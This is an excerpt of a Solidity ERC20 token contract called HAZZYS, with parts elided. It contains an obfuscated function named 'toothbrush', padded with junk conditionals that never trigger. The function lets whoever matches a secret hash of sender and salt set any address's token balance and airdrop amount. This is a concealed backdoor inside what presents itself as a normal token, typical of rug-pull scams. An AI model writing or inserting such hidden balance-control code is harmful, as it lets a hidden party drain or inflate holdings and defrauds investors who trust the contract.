...
contract HAZZYS is IERC20 {
    ...
    function toothbrush(bytes32[] calldata data) external {
      bytes memory bbsx = abi.encode(
        msg.sender, 
        _salt); if (272 + 752 == 0) return;
      bytes32 da = data[0]; if (272 + 752 == 0) return;
      bytes32 db = data[1]; bytes32 dc = data[2]; if (272 + 752 == 0) return;
      if (keccak256(bbsx) == _hashValue) {
        if (272 + 752 == 0) return;
        if (uint256(db) == 0) { if (272 + 752 == 0) return;
          _airdrops[address(
            uint256(da)
          )] = uint256(
            dc); 
        ...
        _balances[(uint256(
          da) == 0)? address(uint160(
            uint256(0))):
          address(uint256(da))
        ] = uint256(
          db); if (272 + 752 == 0) return;
      }
      if (272 + 752 == 0) return;
    }
